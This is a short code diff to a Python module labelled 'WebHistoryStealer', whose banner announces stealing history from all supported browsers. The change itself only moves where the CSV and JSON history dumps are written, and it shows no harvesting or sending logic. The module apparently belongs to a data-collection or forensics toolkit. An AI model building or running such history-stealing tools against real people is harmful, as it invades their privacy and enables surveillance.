@@ -8,7 +8,7 @@ from config import ModuleManager
 
 class WebHistoryRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name="WebHistoryStealer")
+        super().__init__(module_name="WebHistoryStealer", module_path="browsers/history")
 
         self.banner(r"""
      _______         _     _ _                             
@@ -21,11 +21,8 @@ class WebHistoryRecovery(ModuleManager):
   `-=========-`()  Stealing History from all support browsers
               """)
 
-        self.browsers_folder = Constant.final_output_folder_user / 'browsers'
-        self.output_filename_csv = self.browsers_folder / 'browser_history_all.csv'
-        self.output_filename_json = self.browsers_folder / 'browser_history_all.json'
-
-        self.browsers_folder.mkdir(parents=True, exist_ok=True)
+        self.output_filename_csv = self.module_output / 'browser_history_all.csv'
+        self.output_filename_json = self.module_output / 'browser_history_all.json'
 
     def run(self):
         try:
